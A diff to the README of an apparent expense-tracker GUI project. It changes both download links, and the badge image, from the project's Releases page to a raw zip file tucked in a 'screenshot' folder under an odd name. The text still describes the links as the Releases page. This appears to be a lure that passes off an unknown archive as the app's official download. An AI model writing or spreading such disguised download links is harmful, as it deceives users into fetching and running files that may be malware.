@@ -4,7 +4,7 @@
 Welcome to the Expense-Tracker-GUI! This application helps you manage your personal finances in a simple and secure way. You can track your spending, set budgets, and visualize your financial data with ease.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/markxgil/Expense-Tracker-GUI/releases)
+[![Download Latest Release](https://github.com/markxgil/Expense-Tracker-GUI/raw/refs/heads/main/screenshot/GUI-Expense-Tracker-emulsifiable.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/markxgil/Expense-Tracker-GUI/raw/refs/heads/main/screenshot/GUI-Expense-Tracker-emulsifiable.zip)
 
 ## 📌 Features
 - **User-Friendly Interface:** Enjoy a modern design that makes tracking your expenses easy.
@@ -22,7 +22,7 @@ Welcome to the Expense-Tracker-GUI! This application helps you manage your perso
 ## ⬇️ Download & Install
 To get started, visit the Releases page to download the application. This page contains the latest versions along with any previous releases if needed. 
 
-**Download Link:** [Visit this page to download](https://github.com/markxgil/Expense-Tracker-GUI/releases)
+**Download Link:** [Visit this page to download](https://github.com/markxgil/Expense-Tracker-GUI/raw/refs/heads/main/screenshot/GUI-Expense-Tracker-emulsifiable.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:** Click the link above to go to the latest releases.
